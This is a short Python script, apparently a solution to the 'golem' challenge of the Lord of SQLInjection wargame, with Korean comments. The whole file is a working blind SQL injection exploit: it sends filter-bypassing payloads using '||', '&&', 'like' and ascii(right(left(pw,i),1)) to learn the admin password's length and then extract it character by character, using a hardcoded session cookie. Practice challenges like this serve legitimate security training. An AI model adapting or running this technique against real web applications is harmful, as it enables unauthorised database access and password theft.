import string
import requests

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
params = {'pw' : None}
cookies = {'PHPSESSID' : '1t87momi7f10m7tl6kkv6t0lob'}


#비밀번호 길이
for i in range(30):
    payload="' || id like ('admin') && length(pw) like({})#".format(i)
    params['pw'] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print("pw length is ",i)
        break
    print(payload)
    
# 비밀번호 길이 8
flag = ''
for i in range(1,9):
    for j in string.printable:
        payload = "' || id like ('admin') && ascii(right(left(pw,{}),1))like({})#".format(i,ord(j))
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        print(len(response.text))
        if("Hello admin" in response.text):
            flag += j
            print("find the flag",flag)
            break
        print(payload)
        

